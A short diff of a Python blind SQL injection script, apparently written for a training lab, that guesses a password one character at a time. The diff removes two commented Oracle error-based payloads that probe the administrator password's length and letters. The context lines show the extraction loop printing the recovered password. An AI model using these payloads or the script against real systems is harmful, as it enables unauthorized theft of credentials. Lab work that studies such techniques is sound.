@@ -102,8 +102,3 @@ if __name__ == "__main__":
         char = guess_char(args.url, i, 32, 126, cookies)
         password += chr(char)
     print("Password found: ", password)
-
-
-# ' AND (SELECT CASE WHEN LENGTH(password)> 20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'-- 
-
-# ' AND (SELECT CASE WHEN SUBSTR(password, 1, 1)= 'o' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'-- 
